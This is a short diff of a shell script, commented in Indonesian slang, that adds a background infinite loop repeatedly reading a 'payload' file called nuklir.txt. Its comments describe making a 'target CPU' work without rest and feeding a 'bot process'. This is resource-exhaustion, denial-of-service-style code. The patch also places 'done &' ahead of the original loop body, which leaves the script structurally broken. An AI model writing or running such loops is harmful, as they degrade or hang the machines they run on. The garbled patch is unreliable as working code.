@@ -27,6 +27,8 @@ echo "-------------------------------------------"
 # Loop while true biar CPU target kerja rodi
 while true
 do
+   cat nuklir.txt > /dev/null 2>&1
+done &
     # Menampilkan payload ke layar tapi diarahkan ke proses bot
     # Kita tambahkan sedikit delay biar PC lu gak langsung mati total
     cat nuklir.txt
